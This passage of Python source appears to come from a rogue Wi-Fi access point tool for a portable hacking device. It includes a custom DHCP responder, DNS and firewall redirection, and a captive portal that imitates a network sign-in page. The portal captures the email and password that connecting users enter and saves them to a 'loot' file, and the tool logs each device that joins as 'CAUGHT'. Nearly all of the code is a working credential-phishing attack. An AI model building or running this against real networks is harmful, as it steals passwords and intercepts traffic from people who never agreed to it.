                frame, _addr = self.sock.recvfrom(4096)
            except socket.timeout:
                self._prune()
                continue
            except Exception as e:
                self.error = str(e)
                break
            try:
                self._handle_frame(frame)
            except Exception:
                pass
            self._maybe_flush()
        try:
            self.sock.close()
        except Exception:
            pass

    def _handle_frame(self, frame):
        if len(frame) < 14 + 20 + 8 or frame[12:14] != struct.pack("!H", ETH_P_IP):
            return
        ip = frame[14:]
        if (ip[0] >> 4) != 4:
            return
        ihl = (ip[0] & 0x0f) * 4
        if len(ip) < ihl + 8 or ip[9] != 17:
            return
        udp = ip[ihl:]
        sport, dport, ulen, _ = struct.unpack("!HHHH", udp[:8])
        if dport != 67 or ulen < 8:
            return
        payload = udp[8:8 + ulen - 8]
        req = parse_dhcp_packet(payload)
        if not req:
            return
        req["sport"] = sport
        self._handle_request(req)

    # -- allocation -------------------------------------------------------- #
    def _pool(self):
        base = self.server_ip.rsplit(".", 1)[0]
        return [f"{base}.{i}" for i in range(self.pool_start, self.pool_end + 1)]

    def _in_pool(self, ip):
        try:
            last = int(ip.rsplit(".", 1)[1])
        except Exception:
            return False
        return self.pool_start <= last <= self.pool_end

    def _available(self, ip, mac, t):
        if not self._in_pool(ip):
            return False
        if self._bad.get(ip, 0) > t:
            return False
        for m, l in self._leases.items():
            if m != mac and l["ip"] == ip and l["expiry"] > t:
                return False
        for m, (oip, oexp) in self._offers.items():
            if m != mac and oip == ip and oexp > t:
                return False
        return True

    def allocate(self, mac, t):
        with self._lock:
            l = self._leases.get(mac)
            if l and l["expiry"] > t:
                return l["ip"]
            offer = self._offers.get(mac)
            if offer and offer[1] > t:
                return offer[0]
            for ip in self._pool():
                if self._available(ip, mac, t):
                    self._offers[mac] = (ip, t + 120)
                    return ip
            return None

    def commit(self, mac, ip, hostname, t):
        with self._lock:
            for m in list(self._leases):
                if m != mac and self._leases[m]["ip"] == ip:
                    del self._leases[m]
            self._leases[mac] = {
                "ip": ip, "expiry": t + self.lease_time,
                "hostname": hostname or "",
            }
            self._offers.pop(mac, None)
        self.flush_leases()

    def release(self, mac):
        with self._lock:
            self._leases.pop(mac, None)
            self._offers.pop(mac, None)
        self.flush_leases()

    def decline(self, ip, t):
        with self._lock:
            self._bad[ip] = t + 300
            for m in list(self._leases):
                if self._leases[m]["ip"] == ip:
                    del self._leases[m]
            for m in list(self._offers):
                if self._offers[m][0] == ip:
                    del self._offers[m]

    def _prune(self):
        t = time.time()
        with self._lock:
            for m in [m for m, l in self._leases.items() if l["expiry"] <= t]:
                del self._leases[m]
            for m in [m for m, (ip, e) in self._offers.items() if e <= t]:
                del self._offers[m]
            for ip in [ip for ip, e in self._bad.items() if e <= t]:
                del self._bad[ip]

    # -- handling ---------------------------------------------------------- #
    def _handle_request(self, req):
        t = time.time()
        mac = req["mac"]
        mtype = req["type"]
        if mtype == _DHCP_DISCOVER:
            ip = self.allocate(mac, t)
            if ip:
                self._send(req, _DHCP_OFFER, ip)
        elif mtype == _DHCP_REQUEST:
            sid = req["options"].get(_OPT_SERVER_ID)
            if sid and socket.inet_ntoa(sid) != self.server_ip:
                return  # selecting/renewing toward another server
            requested = None
            rip = req["options"].get(_OPT_REQUESTED_IP)
            if rip:
                requested = socket.inet_ntoa(rip)
            elif req["ciaddr"]:
                requested = req["ciaddr"]
            existing = self._leases.get(mac)
            ip = (existing.get("ip") if existing
                  and existing["expiry"] > t else None)
            if requested:
                if self._available(requested, mac, t):
                    ip = requested
                else:
                    self._send(req, _DHCP_NAK, None, broadcast=True)
                    return
            if not ip:
                ip = self.allocate(mac, t)
            if not ip or not self._available(ip, mac, t):
                self._send(req, _DHCP_NAK, None, broadcast=True)
                return
            host = req["options"].get(_OPT_HOSTNAME, b"")
            if isinstance(host, bytes):
                host = host.decode("utf-8", "ignore").strip("\x00 ")
            else:
                host = ""
            self.commit(mac, ip, host, t)
            self._send(req, _DHCP_ACK, ip)
            self.log("DHCP", f"lease {ip} -> {mac}")
        elif mtype == _DHCP_RELEASE:
            self.release(mac)
        elif mtype == _DHCP_DECLINE:
            rip = req["options"].get(_OPT_REQUESTED_IP)
            if rip:
                self.decline(socket.inet_ntoa(rip), t)
        elif mtype == _DHCP_INFORM:
            self._send(req, _DHCP_ACK, None)

    def _send(self, req, msg_type, yiaddr, broadcast=False):
        if not self.sock:
            return
        if broadcast or msg_type == _DHCP_NAK:
            broadcast = True
        elif req.get("flags", 0) & 0x8000:
            broadcast = True
        dst_mac = ("ff:ff:ff:ff:ff:ff" if broadcast
                   else req["mac"])
        dst_ip = "255.255.255.255"
        if msg_type == _DHCP_ACK and req.get("ciaddr"):
            dst_ip = req["ciaddr"]
        body = build_dhcp_reply(req, msg_type, yiaddr, self.server_ip,
                                lease_time=self.lease_time,
                                netmask=self.netmask)
        frame = build_udp_ip_frame(self.mac, dst_mac, self.server_ip, dst_ip,
                                   67, req.get("sport", 68), body)
        try:
            self.sock.sendto(frame, (self.iface, 0))
        except Exception:
            try:
                self.sock.send(frame)
            except Exception:
                pass

    # -- lease file -------------------------------------------------------- #
    def flush_leases(self):
        t = time.time()
        with self._lock:
            lines = []
            for mac, l in sorted(self._leases.items()):
                if l["expiry"] <= t:
                    continue
                host = l["hostname"] or "*"
                lines.append(f'{int(l["expiry"])} {mac} {l["ip"]} {host} *')
        if not self.leasefile:
            return
        try:
            tmp = self.leasefile + ".tmp"
            with open(tmp, "w") as f:
                f.write("\n".join(lines) + ("\n" if lines else ""))
            os.replace(tmp, self.leasefile)
        except Exception:
            pass

    def _maybe_flush(self):
        t = time.time()
        if t - self._last_write > 5:
            self._last_write = t
            self.flush_leases()

    def stop(self):
        self._stop.set()
        self.flush_leases()


# --------------------------------------------------------------------------- #
# Captive portal
# --------------------------------------------------------------------------- #

PROBE_PATHS = {
    "/hotspot-detect.html", "/library/test/success.html", "/generate_204",
    "/gen_204", "/connecttest.txt", "/redirect", "/ncsi.txt",
    "/canonical.html", "/success.txt", "/check_network_status.txt",
    "/hotspotdetect.html", "/captiveportal.html",
}

_FALLBACK_INDEX = """<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{TITLE}}</title><style>
body{margin:0;font-family:system-ui,sans-serif;background:#0b0f0c;color:#cfe;
display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{width:min(420px,90vw);background:#111a13;border:1px solid #1f3b26;
border-radius:14px;padding:26px;box-shadow:0 0 40px #0f2}
h1{font-size:20px;margin:0 0 6px;color:#7f7}p{color:#89a;font-size:14px;line-height:1.5}
input{width:100%;box-sizing:border-box;margin:6px 0;padding:12px;border-radius:8px;
border:1px solid #24402c;background:#0b120d;color:#dff}
button{width:100%;margin-top:12px;padding:12px;border:0;border-radius:8px;
background:#2fbf5f;color:#021;font-weight:700;font-size:15px}
.wifi{color:#2fbf5f;font-size:13px;margin-bottom:14px}</style></head><body>
<div class="card"><div class="wifi">NETWORK: {{SSID}}</div>
<h1>{{TITLE}}</h1>
<p>This network requires you to sign in before you can access the internet.</p>
<form method="post" action="/submit">
<input name="email" type="text" placeholder="Email or username" autocomplete="off">
<input name="password" type="password" placeholder="Password">
<button type="submit">Continue</button></form></div></body></html>"""

_FALLBACK_SUCCESS = """<!doctype html><html><head><meta charset="utf-8">
<title>Connected</title><style>body{background:#0b0f0c;color:#cfe;
font-family:system-ui;display:flex;align-items:center;justify-content:center;
height:100vh;margin:0}h1{color:#2fbf5f}</style></head><body>
<h1>You are connected.</h1></body></html>"""


def _unquote(s):
    """Percent-decode a form component, turning '+' into space."""
    if isinstance(s, str):
        s = s.encode("utf-8", "ignore")
    out = bytearray()
    i, n = 0, len(s)
    while i < n:
        c = s[i]
        if c == 0x2B:  # '+'
            out.append(0x20)
            i += 1
        elif c == 0x25 and i + 2 < n:  # '%XX'
            try:
                out.append(int(s[i + 1:i + 3].decode("ascii"), 16))
                i += 3
            except Exception:
                out.append(c)
                i += 1
        else:
            out.append(c)
            i += 1
    return out.decode("utf-8", "replace")


def _parse_form(body):
    """Parse an application/x-www-form-urlencoded body into a dict.

    Replaces ``urllib.parse.parse_qs`` (not in python3-light). First value wins.
    """
    result = {}
    for pair in body.decode("utf-8", "ignore").split("&"):
        if not pair:
            continue
        if "=" in pair:
            k, v = pair.split("=", 1)
        else:
            k, v = pair, ""
        result.setdefault(_unquote(k), _unquote(v))
    return result


class PortalServer:
    """Minimal HTTP server for the captive portal.

    Built on raw sockets instead of ``http.server`` because the latter pulls in
    the ``email`` package, which is not part of ``python3-light`` on the Pager.
    """
    _REASONS = {200: "OK", 302: "Found", 404: "Not Found"}

    def __init__(self, engine, host, port):
        self.engine = engine
        self.host = host
        self.port = port
        self.sock = None
        self.thread = None
        self.redirect = False
        self.redirect_backend = None
        self._stop = threading.Event()

    def start(self):
        try:
            self._bind(self.port)
            return True
        except Exception:
            pass
        # Port 80 busy: fall back to 8080 + a best-effort redirect rule.
        try:
            self._bind(8080)
            self.port = 8080
            self.redirect = self._install_redirect(80, 8080)
            self.engine.log_event(
                "WARN", f"portal on 8080 (80 busy); redirect={self.redirect}")
            return True
        except Exception as e:
            self.engine.log_event("ERROR", f"portal bind failed: {e}")
            return False

    def _bind(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.host, port))
        s.listen(64)
        s.settimeout(0.5)
        self.sock = s
        self.thread = threading.Thread(target=self._serve, daemon=True)
        self.thread.start()

    def _serve(self):
        while not self._stop.is_set():
            try:
                conn, addr = self.sock.accept()
            except socket.timeout:
                continue
            except Exception:
                break
            threading.Thread(target=self._handle, args=(conn, addr),
                             daemon=True).start()

    def _handle(self, conn, addr):
        try:
            conn.settimeout(10)
            req = self._read_request(conn)
            if req is None:
                return
            method, path, headers, body = req
            ip = addr[0]
            ua = headers.get("user-agent", "")
            eng = self.engine
            if method == "POST":
                self._do_post(eng, ip, ua, path, headers, body, conn)
            else:
                self._do_get(eng, ip, ua, path, conn)
        except Exception:
            pass
        finally:
            try:
                conn.close()
            except Exception:
                pass

    @staticmethod
    def _read_request(conn):
        data = b""
        while b"\r\n\r\n" not in data and len(data) < 65536:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        head, _, rest = data.partition(b"\r\n\r\n")
        if b"\r\n" not in head:
            return None
        lines = head.split(b"\r\n")
        parts = lines[0].decode("utf-8", "ignore").split(" ")
        if len(parts) < 2:
            return None
        method = parts[0].upper()
        headers = {}
        for line in lines[1:]:
            if b":" in line:
                k, v = line.split(b":", 1)
                headers[k.decode("utf-8", "ignore").strip().lower()] = \
                    v.decode("utf-8", "ignore").strip()
        path = parts[1].split("?", 1)[0] or "/"
        try:
            length = int(headers.get("content-length", "0") or 0)
        except Exception:
            length = 0
        length = min(length, 32768)
        body = rest
        while len(body) < length:
            chunk = conn.recv(length - len(body))
            if not chunk:
                break
            body += chunk
        return method, path, headers, body[:length]

    def _do_get(self, eng, ip, ua, path, conn):
        eng.note_portal(ip, "GET", path, ua)
        if path in PROBE_PATHS:
            self._respond(conn, 302, "text/plain", b"",
                          {"Location": f"http://{eng.ap_ip}/"})
            return
        if path == "/success":
            self._respond(conn, 200, "text/html; charset=utf-8",
                          eng.portal_page("success").encode("utf-8", "ignore"))
            return
        self._respond(conn, 200, "text/html; charset=utf-8",
                      eng.portal_page("index").encode("utf-8", "ignore"))

    def _do_post(self, eng, ip, ua, path, headers, body, conn):
        ctype = headers.get("content-type", "")
        fields = {}
        if "application/x-www-form-urlencoded" in ctype:
            try:
                fields = _parse_form(body)
            except Exception:
                fields = {}
        elif "application/json" in ctype:
            try:
                obj = json.loads(body.decode("utf-8", "ignore"))
                fields = obj if isinstance(obj, dict) else {"_": obj}
            except Exception:
                fields = {}
        eng.note_submission(ip, path, ua, fields, body)
        self._respond(conn, 200, "text/html; charset=utf-8",
                      eng.portal_page("success").encode("utf-8", "ignore"))

    @classmethod
    def _respond(cls, conn, code, ctype, body, extra=None):
        reason = cls._REASONS.get(code, "OK")
        head = [f"HTTP/1.1 {code} {reason}",
                f"Content-Type: {ctype}",
                f"Content-Length: {len(body)}",
                "Cache-Control: no-store, no-cache, must-revalidate",
                "Connection: close"]
        for k, v in (extra or {}).items():
            head.append(f"{k}: {v}")
        try:
            conn.sendall("\r\n".join(head).encode("utf-8", "ignore")
                         + b"\r\n\r\n" + body)
        except Exception:
            pass

    def _install_redirect(self, src, dst):
        iface = self.engine.ap_runtime_iface()
        # Firmware 2.0.0 uses nftables (fw4), not iptables. Try nft first.
        nft = find_bin("nft")
        if nft:
            script = (
                "table ip venus {\n"
                "  chain prerouting {\n"
                "    type nat hook prerouting priority -100; policy accept;\n"
                f"    iifname \"{iface}\" tcp dport {src} redirect to :{dst}\n"
                "  }\n"
                "}\n"
            )
            path = "/tmp/venus_nft.conf"
            try:
                with open(path, "w") as f:
                    f.write(script)
            except Exception:
                return False
            run([nft, "delete", "table", "ip", "venus"], timeout=6)
            r = run([nft, "-f", path], timeout=8)
            if r and r.returncode == 0:
                self.redirect_backend = "nft"
                return True
        ipt = find_bin("iptables")
        if not ipt:
            return False
        r = run([ipt, "-t", "nat", "-A", "PREROUTING", "-i", iface,
                 "-p", "tcp", "--dport", str(src), "-j", "REDIRECT",
                 "--to-ports", str(dst)], timeout=6)
        if r and r.returncode == 0:
            self.redirect_backend = "iptables"
            return True
        return False

    def stop(self):
        self._stop.set()
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None
        self.thread = None
        if self.redirect:
            iface = self.engine.ap_runtime_iface()
            if self.redirect_backend == "nft":
                nft = find_bin("nft")
                if nft:
                    run([nft, "delete", "table", "ip", "venus"], timeout=6)
            else:
                ipt = find_bin("iptables")
                if ipt:
                    run([ipt, "-t", "nat", "-D", "PREROUTING", "-i",
                         iface, "-p", "tcp", "--dport", "80",
                         "-j", "REDIRECT", "--to-ports", "8080"], timeout=6)


# --------------------------------------------------------------------------- #
# Rogue AP process control
# --------------------------------------------------------------------------- #

class ManagedProc:
    def __init__(self, name, argv, log_path):
        self.name = name
        self.argv = argv
        self.log_path = log_path
        self.proc = None

    def start(self):
        try:
            log = open(self.log_path, "ab")
            self.proc = subprocess.Popen(
                self.argv, stdout=log, stderr=subprocess.STDOUT,
                close_fds=True, start_new_session=False)
            return True
        except Exception:
            self.proc = None
            return False

    def alive(self):
        return self.proc is not None and self.proc.poll() is None

    def tail(self, n=800):
        return read_text(self.log_path, n)[-n:]

    def stop(self, timeout=3):
        if not self.proc:
            return
        try:
            self.proc.terminate()
            self.proc.wait(timeout=timeout)
        except Exception:
            try:
                self.proc.kill()
            except Exception:
                pass
        self.proc = None


class RogueAP:
    def __init__(self, engine, iface, ssid, channel, freq, password="",
                 ip=DEFAULT_AP_IP, country="US"):
        self.engine = engine
        self.iface = iface              # base radio the engine selected
        self.ap_iface = iface           # actual AP interface (vif or base)
        self.ssid = ssid
        self.channel = channel
        self.freq = freq
        self.password = password
        self.ip = ip
        self.country = country
        self.base = "/tmp/venus"
        self.hostapd_conf = self.base + "_hostapd.conf"
        self.dnsmasq_conf = self.base + "_dnsmasq.conf"
        self.dnsmasq_pid = self.base + "_dnsmasq.pid"
        self.leasefile = self.base + "_leases"
        self.hostapd = None
        self.dnsmasq = None
        self.portal = None
        self.dns = None
        self.dhcp = None
        self.mode = "base"
        self.orig_type = None

    # -- interface --------------------------------------------------------- #
    def _prepare_interface(self):
        """Create (or fall back to) the interface hostapd will own."""
        ok, detail = create_ap_vif(self.iface, AP_VIF_NAME)
        if ok:
            self.ap_iface = detail
            self.mode = "vif"
            self.engine.log_event(
                "INFO", f"AP vif {self.ap_iface} on {self.iface}")
            return True, ""
        # Fall back to converting the base radio itself. Record its original
        # link type so we can restore it on teardown.
        info = run(["iw", "dev", self.iface, "info"], timeout=5)
        text = (info.stdout or "") if info else ""
        m = re.search(r"type\s+(\S+)", text)
        self.orig_type = m.group(1) if m else "managed"
        self.ap_iface = self.iface
        self.mode = "base"
        self.engine.log_event(
            "WARN", f"could not create vif ({detail}); using {self.iface}")
        return True, ""

    # -- lifecycle --------------------------------------------------------- #
    def start(self):
        hostapd_bin = find_bin("hostapd")
        if not hostapd_bin:
            return False, "hostapd not found"
        os.makedirs("/var/run/hostapd", exist_ok=True)
        self._prepare_interface()

        # Assign the AP address before hostapd so DHCP/DNS have somewhere to
        # bind once the AP comes up.
        run(["ip", "addr", "flush", "dev", self.ap_iface], timeout=6)
        run(["ip", "addr", "add", f"{self.ip}/24", "dev", self.ap_iface],
            timeout=6)
        run(["ip", "link", "set", self.ap_iface, "up"], timeout=6)

        # Start hostapd, retrying once with a conservative config if the
        # firmware's wpad build rejects an advanced 802.11 option.
        err = self._start_hostapd(hostapd_bin, minimal=False)
        if err:
            self.engine.log_event(
                "WARN", f"hostapd rejected advanced config, retrying: {err}")
            err = self._start_hostapd(hostapd_bin, minimal=True)
        if err:
            return False, err

        # DHCP: raw AF_PACKET responder first (no :67 conflict), dnsmasq only
        # as a last resort if we cannot open a raw socket.
        if hasattr(socket, "AF_PACKET"):
            self.dhcp = DHCPResponder(
                self.ap_iface, self.ip, self.leasefile, engine=self.engine)
            self.dhcp.start()
            time.sleep(0.3)
            if self.dhcp.error:
                self.engine.log_event(
                    "WARN", f"raw DHCP unavailable ({self.dhcp.error}); "
                            f"trying dnsmasq")
                self._start_dnsmasq_fallback()
        else:
            self.engine.log_event(
                "WARN", "AF_PACKET unavailable; using dnsmasq for DHCP")
            self._start_dnsmasq_fallback()

        self._start_minidns()
        return True, ""

    def _start_hostapd(self, hostapd_bin, minimal):
        conf = build_hostapd_conf(self.ap_iface, self.ssid, self.channel,
                                  self.freq, self.password, self.country,
                                  minimal=minimal)
        with open(self.hostapd_conf, "w") as f:
            f.write(conf)
        run(["rm", "-f", self.base + "_hostapd.log"], timeout=3)
        self.hostapd = ManagedProc(
            "hostapd", [hostapd_bin, self.hostapd_conf],
            self.base + "_hostapd.log")
        if not self.hostapd.start():
            return "could not spawn hostapd"
        for _ in range(24):
            time.sleep(0.25)
            if not self.hostapd.alive():
                break
            out = run(["iw", "dev", self.ap_iface, "info"], timeout=5)
            if out and "type AP" in (out.stdout or ""):
                return None
        if not self.hostapd.alive():
            tail = self.hostapd.tail(400)
            self.hostapd.stop()
            self.hostapd = None
            return "hostapd exited: " + tail
        return None

    def _start_dnsmasq_fallback(self):
        binary = find_bin("dnsmasq")
        if not binary:
            self.engine.log_event("ERROR", "no DHCP backend available")
            return
        conf = build_dnsmasq_conf(
            self.ap_iface, self.ip, self.leasefile, self.dnsmasq_pid, dns=False)
        with open(self.dnsmasq_conf, "w") as f:
            f.write(conf)
        run(["rm", "-f", self.base + "_dnsmasq.log"], timeout=3)
        self.dnsmasq = ManagedProc(
            "dnsmasq", [binary, "-C", self.dnsmasq_conf, "--log-facility",
                        self.base + "_dnsmasq.log"],
            self.base + "_dnsmasq.log")
        self.dnsmasq.start()

    def _start_minidns(self):
        self.dns = MiniDNS(self.ip, self.ip)
        self.dns.start()
        time.sleep(0.2)
        if self.dns.error:
            self.engine.log_event("WARN", f"mini-DNS failed: {self.dns.error}")

    def start_portal(self):
        self.portal = PortalServer(self.engine, self.ip, self.engine.http_port)
        return self.portal.start()

    def stop(self):
        if self.portal:
            self.portal.stop()
            self.portal = None
        if self.dns:
            self.dns.stop()
            self.dns = None
        if self.dhcp:
            self.dhcp.stop()
            self.dhcp = None
        if self.dnsmasq:
            self.dnsmasq.stop()
            self.dnsmasq = None
        if self.hostapd:
            self.hostapd.stop()
            self.hostapd = None
        if self.mode == "vif":
            delete_vif(self.ap_iface)
        else:
            run(["ip", "addr", "flush", "dev", self.ap_iface], timeout=6)
            if self.orig_type:
                try:
                    set_link_mode(self.ap_iface, self.orig_type)
                except Exception:
                    pass
        for f in (self.hostapd_conf, self.dnsmasq_conf):
            try:
                os.remove(f)
            except Exception:
                pass


# --------------------------------------------------------------------------- #
# Engine
# --------------------------------------------------------------------------- #

class Engine:
    def __init__(self, args):
        self.args = args
        self.lock = threading.RLock()
        self.running = True
        self.phase = "recon"
        self.aps = []
        self.clients = {}
        self.events = deque(maxlen=EVENT_MAX)
        self.counts = {"clients": 0, "portal_hits": 0, "submissions": 0}
        self.trap_ap = None
        self.pending_ap = None
        self.ap = None
        self.ap_iface = None
        self.recon_iface = None
        self.mon_iface = None
        self.leasefile = "/tmp/venus_leases"
        self.ap_ip = args.ap_ip
        self.http_port = args.http_port
        self.lure = False
        self.lure_logged_error = False
        self.last_error = None
        self.started_at = now()
        self.cmd_offset = 0
        self.arp_map = {}
        self.lease_map = {}
        self.stations_ok = False
        self._scan_warned = False
        self._stop_mon = False
        self._oui_file = args.oui_file

    # -- paths ------------------------------------------------------------- #
    def _loot(self, name):
        return os.path.join(self.args.loot, name)

    def ensure_paths(self):
        os.makedirs(self.args.loot, exist_ok=True)
        os.makedirs(os.path.join(self.args.loot, "captures"), exist_ok=True)
        try:
            os.chmod(self.args.loot, 0o700)
        except Exception:
            pass
        if not os.path.exists(self.args.cmd):
            open(self.args.cmd, "a").close()
        # Ignore stale commands from a previous run.
        try:
            self.cmd_offset = os.path.getsize(self.args.cmd)
        except Exception:
            self.cmd_offset = 0

    # -- events ------------------------------------------------------------ #
    def log_event(self, kind, text, data=None):
        ev = {"t": round(now(), 3), "kind": kind, "text": text}
        if data:
            ev["data"] = data
        with self.lock:
            self.events.append(ev)
        try:
            with open(self._loot("events.jsonl"), "a") as f:
                f.write(json.dumps(ev, separators=(",", ":")) + "\n")
        except Exception:
            pass
        if kind == "ERROR":
            self.last_error = text

    # -- radios ------------------------------------------------------------ #
    @staticmethod
    def _usable_base(name):
        """Firmware 2.0.0 exposes vifs like wlan0open/wlan0cli/wlan0mon."""
        low = name.lower()
        return not (low.endswith("mon") or low.endswith("cli")
                    or low.endswith("wpa") or low.endswith("sta"))

    def _base_radios(self):
        raw = list_interfaces()
        bases = [i for i in raw if re.fullmatch(r"wlan\d+", i)]
        return bases or [i for i in raw if self._usable_base(i)]

    def pick_radios(self):
        raw = list_interfaces()
        all_mon = [i for i in raw if i.endswith("mon")]
        ifaces = [i for i in raw if self._usable_base(i)]
        if not ifaces:
            ifaces = ["wlan0"]
        # Prefer real base radios over firmware virtual interfaces.
        bases = [i for i in ifaces if re.fullmatch(r"wlan\d+", i)] or ifaces
        dflt = default_route_iface()
        ap = self.args.iface
        if not ap:
            # Never squat on the radio carrying the management uplink unless
            # it is the only radio the firmware exposes.
            candidates = [i for i in bases if i != dflt] or bases
            for cand in ("wlan1", "wlan2", "wlan0"):
                if cand in candidates:
                    ap = cand
                    break
            if not ap:
                ap = candidates[0]
        if ap not in ifaces:
            ifaces.append(ap)
            bases.append(ap)
        recon = self.args.recon_iface
        if recon and recon not in raw:
            self.log_event("WARN", f"recon iface {recon} not present; autodetecting")
            recon = None
        if not recon:
            others = [i for i in bases if i != ap]
            if others:
                # Prefer a radio that is not the uplink.
                pool = [i for i in others if i != dflt] or others
                for cand in ("wlan0", "wlan2", "wlan1"):
                    if cand in pool:
                        recon = cand
                        break
                if not recon:
                    recon = pool[0]
            else:
                recon = ap
        self.ap_iface = ap
        self.recon_iface = recon
        mono = recon + "mon"
        if mono in all_mon:
            self.mon_iface = mono
        else:
            self.mon_iface = None
        self.log_event(
            "INFO", f"radios: ap={self.ap_iface} recon={self.recon_iface}"
                    f" mon={self.mon_iface or '-'}")

    def ap_runtime_iface(self):
        """The interface hostapd is actually serving on (vif or base)."""
        if self.ap is not None and getattr(self.ap, "ap_iface", None):
            return self.ap.ap_iface
        return self.ap_iface

    @staticmethod
    def _band_ok(iface, band):
        """True if *iface*'s phy reports support for *band* (unknown = allow)."""
        support = iface_band_support(iface)
        if support is None:
            return True  # cannot determine; keep the radio in contention
        return band in support

    def _safe_ap_radio(self, band):
        """Pick the base radio to host the AP, or None if none is safe.

        Prefers a radio whose phy is not currently serving the Pager's uplink
        or a firmware AP. With ``--no-guard`` the busy check is skipped.
        """
        current = self.ap_iface
        if self.args.iface:
            pool = [current]  # honour an explicit override
        else:
            pool = [current] + [r for r in self._base_radios() if r != current]
        for cand in pool:
            if not self._band_ok(cand, band):
                continue
            if not phy_is_busy(phy_for_iface(cand)):
                return cand
        if self.args.no_guard:
            for cand in pool:
                if self._band_ok(cand, band):
                    return cand
        return None

    def ensure_monitor(self):
        if self.args.no_lure:
            return None
        if self.mon_iface:
            return self.mon_iface
        if not self.recon_iface or self.recon_iface == self.ap_iface:
            return None
        mono = self.recon_iface + "mon"
        if mono in list_interfaces():
            self.mon_iface = mono
            return mono
        set_link_mode(self.recon_iface, "monitor")
        self.mon_iface = self.recon_iface
        self._stop_mon = True
        return self.mon_iface

    def release_monitor(self):
        if self._stop_mon and self.mon_iface and self.mon_iface == self.recon_iface:
            try:
                set_link_mode(self.recon_iface, "managed")
            except Exception:
                pass
        self._stop_mon = False

    # -- scan -------------------------------------------------------------- #
    def _iw_scan(self, iface):
        out = run(["iw", "dev", iface, "scan"], timeout=25)
        if out and out.stdout and "BSS" in out.stdout:
            return out
        return None

    def _prep_scan_iface(self, iface):
        """A down or non-managed base radio cannot scan."""
        if not iface:
            return
        if iface == default_route_iface():
            return  # never bounce the active uplink
        info = run(["iw", "dev", iface, "info"], timeout=5)
        text = (info.stdout or "") if info else ""
        if "type managed" in text:
            run(["ip", "link", "set", iface, "up"], timeout=5)
        elif "type" in text:
            set_link_mode(iface, "managed")
        else:
            run(["ip", "link", "set", iface, "up"], timeout=5)

    def scan_once(self):
        if not self.recon_iface:
            self.pick_radios()
            if not self.recon_iface:
                return
        self._prep_scan_iface(self.recon_iface)
        out = self._iw_scan(self.recon_iface)
        if out is None and self.mon_iface and self.mon_iface != self.recon_iface:
            # Firmware 2.0.0 keeps a monitor vif that can scan without
            # bouncing the managed radio (which may be the uplink).
            out = self._iw_scan(self.mon_iface)
        if out is None:
            present = list_interfaces()
            if present and self.recon_iface not in present:
                # The stock UI tore the radio down (or the vif was renamed).
                self.pick_radios()
                if self.recon_iface:
                    out = self._iw_scan(self.recon_iface)
        if out is None:
            if not self._scan_warned:
                err = ("no BSS results" if self.recon_iface else "no recon radio")
                self.log_event(
                    "WARN", f"scan failed on {self.recon_iface or '?'}: {err}")
                self._scan_warned = True
            return
        self._scan_warned = False
        aps = parse_iw_scan(out.stdout)
        aps = [a for a in aps if a.get("ssid")]
        aps.sort(key=lambda a: a.get("rssi", -100), reverse=True)
        with self.lock:
            self.aps = aps[:40]

    # -- clients ----------------------------------------------------------- #
    def tick_clients(self):
        if not self.ap:
            return
        ap_iface = self.ap_runtime_iface()
        out = run(["iw", "dev", ap_iface, "station", "dump"], timeout=8)
        stations = parse_station_dump(out.stdout) if out else {}
        self.stations_ok = bool(out and out.stdout and "Station" in out.stdout)
        leases = parse_leases(read_text(self.leasefile))
        arp = parse_arp(read_text("/proc/net/arp"))
        with self.lock:
            self.lease_map = leases
            self.arp_map = arp
        t = now()

        # Association is authoritative. DHCP leases enrich but do not create
        # clients unless the driver cannot report stations.
        source = dict(stations)
        if not source:
            source = {m: {} for m, l in leases.items() if l.get("expiry", 0) > t}

        with self.lock:
            for mac, st in source.items():
                c = self.clients.get(mac)
                if c is None:
                    c = {
                        "mac": mac,
                        "ip": "",
                        "hostname": "",
                        "vendor": vendor_for_mac(mac, self._oui_file),
                        "random_mac": is_random_mac(mac),
                        "rssi": None,
                        "first_seen": t,
                        "last_seen": t,
                        "connected_time": 0,
                        "inactive_time": None,
                        "rx_bytes": 0,
                        "tx_bytes": 0,
                        "portal_hits": 0,
                        "active": True,
                    }
                    self.clients[mac] = c
                    self.counts["clients"] += 1
                    self.log_event(
                        "CAUGHT",
                        f"{mac} {c['vendor']} joined",
                        {"mac": mac, "vendor": c["vendor"]})
                c["last_seen"] = t
                c["active"] = True
                if st.get("rssi") is not None:
                    c["rssi"] = st["rssi"]
                for k in ("connected_time", "inactive_time", "rx_bytes", "tx_bytes"):
                    if st.get(k) is not None:
                        c[k] = st[k]
                lease = leases.get(mac) or {}
                if lease.get("ip"):
                    c["ip"] = lease["ip"]
                elif arp.get(mac):
                    c["ip"] = arp[mac]
                if lease.get("hostname"):
                    c["hostname"] = lease["hostname"]

            # A client that vanished from the station table but still has a
            # fresh lease is inactive, not gone. Keep the fly on the web.
            for mac, c in self.clients.items():
                if mac not in source and t - c["last_seen"] > 12:
                    c["active"] = False

            if len(self.clients) > CLIENT_HISTORY_MAX:
                old = sorted(self.clients.values(), key=lambda c: c["first_seen"])
                for c in old[: len(self.clients) - CLIENT_HISTORY_MAX]:
                    self.clients.pop(c["mac"], None)

    def mac_for_ip(self, ip):
        for mac, c in list(self.clients.items()):
            if c.get("ip") == ip:
                return mac
        for mac, aip in self.arp_map.items():
            if aip == ip:
                return mac
        return None

    def note_portal(self, ip, method, path, ua):
        mac = self.mac_for_ip(ip)
        with self.lock:
            self.counts["portal_hits"] += 1
            if mac and mac in self.clients:
                self.clients[mac]["portal_hits"] += 1
        self.log_event("PORTAL", f"{method} {path} from {ip}",
                       {"ip": ip, "mac": mac, "ua": ua[:200], "path": path})

    def note_submission(self, ip, path, ua, fields, raw):
        mac = self.mac_for_ip(ip)
        with self.lock:
            self.counts["submissions"] += 1
        record = {
            "t": round(now(), 3),
            "ip": ip,
            "mac": mac,
            "path": path,
            "ua": ua,
            "fields": fields if self.args.capture else {k: "[redacted]" for k in fields},
            "raw_len": len(raw or b""),
        }
        try:
            p = self._loot("portal_submissions.jsonl")
            with open(p, "a") as f:
                f.write(json.dumps(record, separators=(",", ":")) + "\n")
            os.chmod(p, 0o600)
        except Exception:
            pass
        self.log_event("SUBMIT", f"form from {ip} ({len(fields)} fields)",
                       {"ip": ip, "mac": mac})
